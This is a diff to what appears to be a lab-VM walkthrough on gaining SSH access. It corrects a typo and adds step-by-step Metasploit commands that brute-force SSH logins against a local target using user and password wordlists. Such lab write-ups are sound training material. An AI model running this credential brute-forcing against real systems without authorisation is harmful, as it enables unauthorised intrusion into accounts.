@@ -284,7 +284,7 @@ Now let's get stuck in and get access to this system. 👻
 We have a number of methods available to us to gain access to this VM.
 
 **Method 1 - Hydra:**
-Furst we need the IP address of the target system.
+First we need the IP address of the target system.
 
 Run `netdiscover` to list active IP address on the subnet - change the subnet range in the command to suit your environment.
 
@@ -316,7 +316,52 @@ After a very short time Hydra gets a hit!
 ![Screenshot 2022-12-15 151908](https://user-images.githubusercontent.com/117080369/207898427-712cecb0-9c78-453e-9787-f13060811087.png)
 
 **Method 2 - Metasploit:**
+Launch `Metasploit` by running the command below.
 
+```bash
+msfconsole -q
+```
+
+Select the `SSH_Login Scanner`
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+```
+
+Next we need to see what options are required, run the command below.
+
+```bash
+show options
+```
+![Screenshot 2022-12-15 153420](https://user-images.githubusercontent.com/117080369/207902136-f7b2a223-cdfb-4d5a-8bb8-9c504a4098b5.png)
+
+We need to set `RHOSTS`, `PASS_FILE`, `USER_FILE`, `STOP_ON_SUCCESS` & `VERBOSE` options, run the commands below.
+
+```bash
+set verbose true
+
+set stop_on_success true
+
+set rhosts 10.0.2.5
+
+set pass_file /home/boneshadow/passwords.txt
+
+set user_file /home/boneshadow/users.txt
+```
+
+Run `show options` to confirm you have set the required options.
+
+![Screenshot 2022-12-15 154028](https://user-images.githubusercontent.com/117080369/207903662-bf5ceb0a-a991-4b15-999c-18558f09f45c.png)
+
+Only thing left to do now is to run the module.
+
+```bash
+run
+```
+
+After a very short time Metasploit gets a hit!
+
+![Screenshot 2022-12-15 154308](https://user-images.githubusercontent.com/117080369/207904493-6719cafb-c219-4bc1-8f0d-6240cdd224bd.png)
 
 **Method 3 - Manual:**
 Make an assumption about the password and just try each combination manually until you maybe get lucky.
